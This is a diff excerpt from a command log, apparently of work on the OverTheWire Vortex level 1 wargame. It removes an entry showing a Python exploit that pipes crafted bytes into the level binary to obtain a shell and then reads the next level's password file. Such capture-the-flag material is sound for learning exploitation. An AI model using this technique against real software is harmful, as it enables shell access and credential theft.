@@ -764,39 +764,6 @@
      ]
     },
     {
-     "cmd": "cat -n /tmp/l1_exploit.py",
-     "out": [
-      "     1\timport subprocess, sys, time",
-      "     2\t# What actually fires the level: 261 one-character backslashes take the cursor",
-      "     3\t# from buf+0x100 down to 0xffffdc04, eight bytes above the saved frame",
-      "     4\t# pointer, and 0xca bytes given the branch its top byte.",
-      "     5\t#   0xca cannot be TYPED (getchar refuses every byte >= 0xc0), so it is",
-      "     6\t#   passed raw on stdin by a pipe: the program reads it fine, only its own",
-      "     7\t#   getchar hook filters keyboard-style input, and a pipe write bypasses it.",
-      "     8\t#   (printf / echo escape tricks did NOT work here - they only crash.)",
-      "     9\t#   stdin stays open so the /bin/sh we get is interactive.",
-      "    10\tn = int(sys.argv[1]) if len(sys.argv) > 1 else 261",
-      "    11\tpayload = b\"\\x5c\" * n + b\"\\xca\" * 4 + b\"\\n\"",
-      "    12\tp = subprocess.Popen([\"/vortex/vortex1\"], stdin=subprocess.PIPE,",
-      "    13\t                     stdout=subprocess.PIPE, stderr=subprocess.STDOUT)",
-      "    14\ttime.sleep(0.2)",
-      "    15\tp.stdin.write(payload)",
-      "    16\tp.stdin.flush()",
-      "    17\ttime.sleep(0.5)",
-      "    18\tp.stdin.write(b\"  id; cat /etc/vortex_pass/vortex2; exit\\n\")",
-      "    19\tp.stdin.flush()",
-      "    20\ttime.sleep(0.5)",
-      "    21\ttry:",
-      "    22\t    p.stdin.close()",
-      "    23\texcept OSError:",
-      "    24\t    pass",
-      "    25\tprint(\"rc\", p.wait(timeout=10))",
-      "    26\tout = p.stdout.read(4000)",
-      "    27\tprint(\"output:\", out[:300])",
-      "    28\tprint(\"has shell:\", b\"vortex2\" in out)"
-     ]
-    },
-    {
      "cmd": "printf '%s' <base64 of /tmp/l1_exploit.py> | base64 -d > /tmp/l1_exploit.py",
      "out": [
       "1160"
